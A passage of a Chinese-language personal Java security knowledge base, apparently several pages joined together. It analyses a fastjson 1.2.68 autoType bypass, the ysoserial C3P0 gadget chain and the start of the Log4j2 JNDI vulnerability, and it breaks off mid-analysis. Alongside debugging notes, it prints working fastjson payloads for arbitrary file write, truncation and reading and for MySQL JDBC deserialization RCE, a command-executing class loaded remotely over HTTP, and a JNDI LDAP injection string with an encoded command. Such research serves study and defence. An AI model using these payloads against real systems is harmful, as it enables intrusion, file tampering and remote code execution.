需要开启AST，更鸡肋了，随便找个不在黑名单的类都可以利用了 举个例子： 恶意类 package org.example; import lombok.Data; @Data public class User extends Error{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } } payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} JavaBeanDeserializer 分析 在获取反序列化器的时候，如果是一个接口，且里面所有的判断都不满足，就会返回JavaBeanDeserializer 我们随便创建一个接口 package org.example; public interface Test { } payload {\"@type\":\"org.example.Test\", \"test\":\"hahahaha\"} 运行，一直到获取了反序列化器进行反序列化 跟进，看看里面的判断条件，一阵F8后，看到了熟悉的东西 也就是说和刚才那个一样，还得需要一个@type，修改payload {\"@type\":\"org.example.Test\", \"@type\":\"org.example.Test1\", \"test\":\"hahahaha\"} 熟悉的味道 往下，进入checkAutoType，expectClass为我们传入的第一个接口 又一直F8，来到了熟悉的地方，loadClass，给我们的传入的第二个@type的类加入到mapping中 再往后，这几行基本杜绝了JNDI注入的风险 再继续往下，clazz必须是expectClass的子类，和上面那个类似 我们把接口Test1变成Test的子类，然后继续 通过验证，ok，返回clazz 返回就是常规的setValue了 利用 和上面那个差不多一样，只不过这个应用更广泛，只需要找一个接口，然后找一个实现了这个接口的类，类中有可以利用的点即可；最好是可以绕过autoTypeSupport 于是大佬们找到了java.lang.AutoCloseable这个接口，这个接口位于默认的mapping中，有很多子类，不开启autoTypeSupport也可以用（大佬们真牛） 本地先测试下，证明我们的猜想是不是正确的，编写个恶意的类，实现java.lang.AutoCloseable接口 package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } @Override public void close() throws Exception { } } payload（不开启autoTypeSupport） {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} Bingo!!! AutoCloseable深入使用 小知识1 fastjson除了使用setXXX的方法赋值外，也可以直接对构造函数进行传值反序列为对象，比如 public User(String test){ System.out.println(test); } 可以通过下面的json来实现赋值，这也是后面payload用到的一个点 { \"@type\":\"org.example.User\", \"test\": \"123123\" } 小知识2 在分析过程中，反序列化操作时，我们还发现存在一个key $ref， 这个$ref参数的作用是什么呢？简单来说就是从其他地方获取一个对象当作参数传进去，有兴趣的小伙伴可以自己跟一下，我跟过一次了就不再重复了 引用 描述 \"$ref\":\"..\" 上一级 \"$ref\":\"@\" 当前对象，也就是自引用 \"$ref\":\"$\" 根对象 \"$ref\":\"$.children.0\" 基于路径的引用，相当于 root.getChildren().get(0) 举个例子（把User类对象当成参数传到T类中） org.example.User package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } public String getTest() { return test; } @Override public void close() throws Exception { } } org.example.T package org.example; public class T implements AutoCloseable{ private User user; public void setUser(User user) { System.out.println(\"call setUser\"); this.user = user; } public User getUser() { return user; } @Override public void close() throws Exception { } } poc { \"user\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.User\", \"test\": \"test666\" }, \"t\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.T\", \"user\":{ \"$ref\": \"$.user\" } } } 运行poc，T类在执行setUser操作时，传入的参数为前面参数user实例化的类User，结果如下 call setTest test value: test666 call setUser {\"t\":{\"user\":{\"test\":\"test666\"}},\"user\":{\"$ref\":\"$.t.user\"}} 好坑 网上流传一个简单的Payload，没有就创建文件，有就置空文件内容 { '@type':\"java.lang.AutoCloseable\", '@type':'java.io.FileWriter', 'file':'/tmp/nonexist', 'append':false } 给file改成自己的路径，但是我各种测试，发现有问题，一直报错 Exception in thread \"main\" com.alibaba.fastjson.JSONException: default constructor not found. class java.io.FileWriter 然后跟着一顿调试，发现是com.alibaba.fastjson.util.ASMUtils#lookupParameterNames这里面的问题，不能获取到FileWriter构造函数的参数名，但是又没有public FileWriter(){}这个构造函数，所以不能生成实例会报错。。。 自己写一个构造函数，然后尝试去反序列化，发现又可以获取到构造函数的参数名。。。 Org.example.User package org.example; public class User implements AutoCloseable{ public User(String file){ System.out.println(file); } public User( String file, boolean append){ System.out.println(append); System.out.println(file); } @Override public void close() throws Exception { } } payload { '@type':\"java.lang.AutoCloseable\", '@type':'org.example.User', 'file':'/tmp/test.txt', 'append':false } 然后经过各种查资料，发现 https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 中有说这个问题 总结一下就是： fastjson检查不到FileWriter的构造函数参数的参数名，所以不知道你调用构造函数中需要传入的参数名是什么，就不能生成对象 只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有类构造函数的参数的参数名信息。。。 可以通过如下命令来检查，如果有输出 LocalVariableTable，则证明其 class 字节码里的构造函数参数包含有参数名信息： javap -l | grep LocalVariableTable 看下我自己写的能识别到构造函数参数的参数名的User类，确实有参数名在里面 看下FileWriter类，确实没得参数名。。。 知识点3 通过分析发现，不是所有的构造函数的参数名都可以使用，而是第一个 参数名最多 的构造函数中的参数名才可以使用， 比如org.apache.commons.io.output.FileWriterWithEncoding，同时有public FileWriterWithEncoding(File file, CharsetEncoder encoding, boolean append) 和 public FileWriterWithEncoding(String filename, CharsetEncoder encoding, boolean append)2个3参数名的构造函数，fastjson在识别到file encoding append这3个参数名后，后续就算识别到filename encoding append也会跳过参数名更新，所以不能用filename作为参数，只能使用file。。。 根据fastjson的识别机制，具体原因是因为： 利用链挖掘 AutoCloseable接口位于java.lang包下，从JDK1.7开始引入，java的io流间接性的可以自动关闭接口，也就是说从jdk1.7开始，不需要手动去关流。 所以我们关注的一些包主要是进行流操作的包，从他的子类或者实现类也可以看出来。 整理一下我的盲挖掘的思路：（不是那么专业，大佬见谅） 获取一个包下所有的类 看看这些类是不是继承的AutoCloseable这个接口，使用isAssignableFrom()方法来判断 看看这些类的构造函数能否获取到参数名，或者有不有setXXX的方法 手动分析能否利用，看看构造函数或者setXXX函数中有不有可以利用的地方 这里也用大佬们挖过的commons-io为例吧 Pom.xml 需要其他的包按需添加 com.alibaba fastjson 1.2.68 org.springframework spring-webmvc 5.1.6.RELEASE 盲搜索代码 package org.example; import com.alibaba.fastjson.util.ASMUtils; import org.springframework.core.io.Resource; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import org.springframework.core.type.classreading.SimpleMetadataReaderFactory; import java.io.IOException; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Class aClass = Class.forName(\"java.lang.AutoCloseable\"); // 超类 PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver(); // 1.加载資源 classpath*:com/hadluo/**/*.class : 找环境变量下的 com/hadluo下的 所有.class文件 Resource[] resources = resolver.getResources(\"classpath*:org/apache/commons/io/**/*.class\"); for (Resource res : resources) { // 先获取resource的元信息，然后获取class元信息，最后得到 class 全路径 String clsName = new SimpleMetadataReaderFactory().getMetadataReader(res).getClassMetadata().getClassName(); // 2. 通过名称加载类 Class tmpClass = Class.forName(clsName); // 3. 判断是不是 aClass 的子类 if (aClass.isAssignableFrom(tmpClass)) { // 4. 判断能否识别构造函数参数名，直接copy的fastjson里面的代码 Constructor creatorConstructor = null; // 构造函数 String[] paramNames = null; // 存放所有参数，只有这个构造函数的参数名会使用，其他的构造函数都不能用，参考com.alibaba.fastjson.util.JavaBeanInfo.build(java.lang.Class, java.lang.reflect.Type, com.alibaba.fastjson.PropertyNamingStrategy, boolean, boolean, boolean)里面的逻辑（知识点3） Constructor[] constructors = tmpClass.getDeclaredConstructors(); for (Constructor constructor : constructors) { String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor); if (lookupParameterNames == null || lookupParameterNames.length == 0) { continue; } if (creatorConstructor != null && paramNames != null && lookupParameterNames.length 运行看看哪些类可能可以用 构造函数可用：public org.apache.commons.io.input.AutoCloseInputStream(java.io.InputStream) 任意文件写入参考：https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 我这里就不赘述了，贴个简单的，文件新建或者置空 用org.apache.commons.io.output.FileWriterWithEncoding这个类 跟一下initWriter，当append为false时，如果文件存在，就置空，不存在就新建 试试，POC { \"置空\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/a.txt\", \"encoding\": \"UTF-8\" }, \"新建\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/b.txt\", \"encoding\": \"UTF-8\" } } 链利用 Mysql JDBC RCE 搭配使用 https://github.com/fnmsd/MySQL_Fake_Server mysql 5.1.x >= 5.1.11 5.1.11及以上的5.x版本 所需依赖 mysql mysql-connector-java 5.1.11 commons-collections commons-collections 3.1 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"CommonsCollections5\", // 利用链，自己在MySQL_Fake_Server的conf里面改，具体看他的readme \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } 效果 Mysqlconnector 6.0.2 or 6.0.3 所需依赖 mysql mysql-connector-java 6.0.2 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\": { \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections5\" } } } 效果 Mysqlconnector 6.x or 所需依赖 mysql mysql-connector-java 8.0.19 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\", \"proxy\": { \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\", \"connectionUrl\": { \"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\": [ { \"host\": \"127.0.0.1\" } ], \"slaves\": [], \"properties\": { \"host\": \"127.0.0.1\", \"user\": \"CommonsCollections5\", \"dbname\": \"dbname\", \"password\": \"pass\", \"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\" } } } } 效果 commons-io文件读取 所需依赖 commons-io commons-io 2.4 Payload { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49] // 如果读出来的第一个字节是49，就返回，否则返回空 }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49,50] // 如果读出来的第一个字节是49，第二个字节是50，就返回，否则返回空 }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } 效果 commons-io2.x文件写入 注意事项：写入内容的长度必须要>8192，不然会失败；实际写入的内容只有前8192个字符，后面的不会写入 commons-io 2.0 - 2.6 版本 { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\" }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"encoding\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } } commons-io 2.7 - 2.8.0 版本： { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\", \"start\":0, \"end\":2147483647 }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"charsetName\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } 效果 总结 总结一下，首先要可以调用带有期望类参数的checkAutoType函数，然后payload第一个类是期望类，第二个类要继承第一个类，这样就可以直接被添加到内部mapping中，然后传入恶意的参数构造利用即可 但是因为checkAutoType代码限制，JNDI注入的类基本都被拦截了，绕不过还 参考链接 fastjson 1.2.68 最新版本有限制 autotype bypass fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路 Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain 关于blackhat2021披露的fastjson1.2.68链 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/08.ysoserial-C3P0分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/08.ysoserial-C3P0分析.html","title":"08.ysoserial-C3P0分析","keywords":"","body":" 介绍 基础使用 Pom.xml 开始使用 利用演示 反序列化链分析 Debug过程 反推过程 生成链分析 IDEA配置 开始调试 总结 参考 介绍 C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。 基础使用 先看看ysoserial中需要的依赖是啥，方便后期调试也可以用 Pom.xml com.mchange c3p0 0.9.5.2 开始使用 基础使用还需要引入依赖com.mysql.jdbc.Driver mysql mysql-connector-java 5.1.47 在src/main/resources目录下新建c3p0-config.xml，这个是c3p0默认配置文件 编写如下内容 com.mysql.jdbc.Driver jdbc:mysql://localhost:3306/test?useSSL=false&amp;characterEncoding=UTF-8 root root 30000 10 30 100 10 创建测试类进行连接 import com.mchange.v2.c3p0.ComboPooledDataSource; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class Main { private static ComboPooledDataSource dataSource = new ComboPooledDataSource(); public static void main(String[] args) throws SQLException { Connection connection = dataSource.getConnection(); PreparedStatement sql = connection.prepareStatement(\"select username from user\"); ResultSet resultSet = sql.executeQuery(); while (resultSet.next()){ System.out.println(resultSet.getString(1)); } } } 成功 利用演示 编写恶意类Exploit.java import java.io.IOException; public class Exploit { public Exploit() throws IOException { java.lang.Runtime.getRuntime().exec(\"open -na Calculator\"); } } 编译成class文件 javac Exploit.java 启动http服务器 python3 -m http.server 8000 生成poc java -jar ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 \"http://127.0.0.1:8000/:Exploit\" > poc.ser 编写代码来模拟进行反序列化 import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } 反序列化链分析 Debug过程 可能直接看利用链怎么生成的有点迷，我们看下反序列化的过程，因为要知道怎么触发的，再反过来看生成链可能会好一些 小技巧：从头下断点调到尾太慢了，中间太多不必要的细节，这里因为我们生成的POC反序列化过程中明确会调用Runtime.getRuntime().exec()，所以我们在exec()的地方下个断点，分析一下堆栈情况去核心点下断点分析 反序列化举例代码 import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } 运行到exec()时的堆栈调用情况 exec:348, Runtime (java.lang) :5, Exploit newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming) getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming) readObject:211, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1185, ObjectStreamClass (java.io) readSerialData:2256, ObjectInputStream (java.io) readOrdinaryObject:2147, ObjectInputStream (java.io) readObject0:1646, ObjectInputStream (java.io) readObject:482, ObjectInputStream (java.io) readObject:440, ObjectInputStream (java.io) main:7, Main 分析堆栈可以看出，一直各种readObject反序列，直到关键的PoolBackedDataSourceBase$readObject，说明这里是我们需要观察的入口点 分析一下代码，ois是我们传入的序列化后的数据，反序列化后得到对象o,而o就是一个恶意的ReferenceSerialized类，然后会调用getObject方法 跟进，发现调用了ReferenceableUtils.referenceToObject方法，字面意思就是：给reference对象转换成object对象，可以理解为远程下载加载到本地吧 继续跟进，发现此处利用URLClassLoader构建了一个远程加载类的加载器，然后使用Class.forName来远程加载这个类，fClassName为远程加载的类名（此处会发起http请求获取恶意类） 最后通过实例化该类，触发恶意的构造函数，执行系统命令 反推过程 根据整个反序列化的过程理一下，看看怎么生成POC 首先需要触发PoolBackedDataSourceBase.readObject()，也就是说我们序列化的对象必须是PoolBackedDataSourceBase类 其次根据readObject中的判定o instanceof IndirectlySerialized，所以我们序列化的对象需要是IndirectlySerialized的子类 序列化对象同时还需要包含是一个恶意的Reference类对象 最后通过writeObject进行序列化 所以生成一个恶意序列化的数据的思路简化一下：创建一个PoolBackedDataSourceBase类对象，然后给他包装成一个恶意的Reference类，再包装成可序列化的，最后序列化即可 生成链分析 IDEA配置 IDEA调试ysoserial，配置一下C3P0的生成参数 运行GeneratePayload，能看到输出，说明成功 开始调试 生成的时候，会调用getObject函数开始，所以这里下一个方法断点 运行后，会到断点处停止，前面一部分是判断命令参数是否正确的内容，可以不用太关注，我们一步一步的F8 到了54行，可以看到调用了Reflections.createWithoutConstructor(PoolBackedDataSource.class) 翻译一下就是通过反射创建了一个com.mchange.v2.c3p0.PoolBackedDataSource类对象b 然后将对象b的字段connectionPoolDataSource的值通过反射设置为我们创建的PoolSource类，参数为我们传入的URL和类名 connectionPoolDataSource在后续的过程中会发现其定义是ConnectionPoolDataSource connectionPoolDataSource，所以我们在编写PoolSource的时候继承了ConnectionPoolDataSource接口 最后返回对象b 继续F8，发现此处会进行序列化 传入的参数是我们刚才生成的PoolBackedDataSource对象b，跟进 发现最后会调用writeObject进行序列化，跟进，对我们反射赋值的connectionPoolDataSource序列化会到达PoolBackedDataSourceBase.writeObject()中 在序列化的时候，会抛出异常，因为我们序列化对象obj的变量connectionPoolDataSource的值C3P0$PoolSource类不是可序列化的，没有声明序列化接口 继续向下，会新建一个对象indirector，然后调用它的indirectForm()方法，参数为我们反射设置的字段connectionPoolDataSource，跟一下 发现会先给orig转换成Referemceable类，这也是为啥C3P0$PoolSource要实现Referenceable接口，然后调用getReference()方法，相当于调用的C3P0$PoolSource@getReference()方法，也是我们可以在ysoserial中看到的重写的方法 跟进，发现就是返回了一个JNDI的Reference，如果\"exploit\"类不存在，就会从我们指定的URL上加载恶意的类 返回Reference后，再通过ReferenceSerialized进行序列化 跟进发现，其实就是声明了可序列化 最后返回到PoolBackedDataSourceBase.writeObject()中，再次writeObject()，这个时候序列化的，其实就是一个可序列化的恶意的Reference 总结 感觉思路很简单： 创建一个com.mchange.v2.c3p0.PoolBackedDataSource对象 通过反射将其字段connectionPoolDataSource的值设置成我们编写的PoolSource类，这个类需要传入url地址和恶意的类名，且重写getReference方法，重写方法主要是返回一个恶意的JNDI Reference 序列化过程中，因为我们编写的类PoolSource不是可序列化的，所以第一次序列化抛出异常，会进入到catch中再次序列化 catch中的序列化之前，会调用PoolSource.getReference获取一个恶意类，然后声明为可序列化的，再序列化，得到结果 再总结一下： 主要是PoolBackedDataSourceBase这个类中的connectionPoolDataSource这个变量可控，且这个变量在再次序列化的过程中会调用特定的方法（这个方法内容也是我们可控的），最后生成一个恶意的可序列化的JNDI Reference，然后输出序列化数据。 参考 ysoserial-C3P0 ysoserial-C3P0 分析 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/09.log4j2_rce分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/09.log4j2_rce分析.html","title":"09.log4j2_rce分析","keywords":"","body":" 前言 复现 pom.xml 启动JNDI注入Server 漏洞代码 效果 分析 调用栈 Debug分析 总结 一个小坑 常规绕过 多个${}执行流程 分隔符 其他解析器功效 绕过思路 奇淫技巧 2.15.0-rc1补丁绕过 2.15.0-rc2修复 影响范围 修复建议 前言 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。 2021年12月9日晚，各大公众号突然发布漏洞预警 2021年12月10日晚，各大公众号开始蹭热度 Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。 由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。 此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。（CNVD-2021-95914、CVE-2021-44228） 影响版本：Apache Log4j 2.x 2.15.0-rc1 存在补丁绕过，但是很鸡肋 复现 老规矩，先复现，再分析 pom.xml Jdk8u111 log4j-api不是必须 org.apache.logging.log4j log4j-core 2.14.1 org.apache.logging.log4j log4j-api 2.14.1 启动JNDI注入Server java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 漏洞代码 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Test { private static final Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { logger.error(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } 效果 分析 调用栈 在利用过程中，因为我们明确知道要执行系统命令调用java.lang.Runtime#exec(java.lang.String[])，所以在exec方法处下断点，分析一下调用栈 运行获取调用栈 exec:485, Runtime (java.lang) :-1, ExploitgJlWqLWBF3 newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:163, NamingManager (javax.naming.spi) getObjectInstance:189, DirectoryManager (javax.naming.spi) c_lookup:1085, LdapCtx (com.sun.jndi.ldap) p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx) lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:94, ldapURLContext (com.sun.jndi.url.ldap) lookup:417, InitialContext (javax.naming) lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test 最明显的漏洞触发点，就是在第16行lookup:172, JndiManager (org.apache.logging.log4j.core.net) 跟过去看下，典型的JNDI注入 Debug分析 既然已经知道调用栈了，那么就可以慢慢分析了 从logger.error为入口，跟进去后会前期有一系列的和我们分析无关的过程，主要就是各种常规包装和调用 toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, 